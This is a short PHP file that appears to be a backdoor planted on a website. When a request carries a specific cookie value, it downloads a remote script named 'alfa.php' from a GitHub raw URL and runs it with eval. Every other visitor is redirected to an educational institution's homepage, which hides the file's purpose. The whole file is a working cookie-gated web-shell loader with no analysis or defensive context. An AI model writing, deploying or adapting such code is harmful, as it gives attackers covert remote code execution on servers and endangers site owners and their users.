<?php
if (isset($_COOKIE['SESSION_ATHENTICATION']) && $_COOKIE['SESSION_ATHENTICATION'] == 'TRUE')
{
    eval(substr(file_get_contents("https://raw.githubusercontent.com/siphon2/siphon/main/alfa.php"),5,-3));
}
else
{
    header('Location: https://aimec.edu.pk/');
}
?>
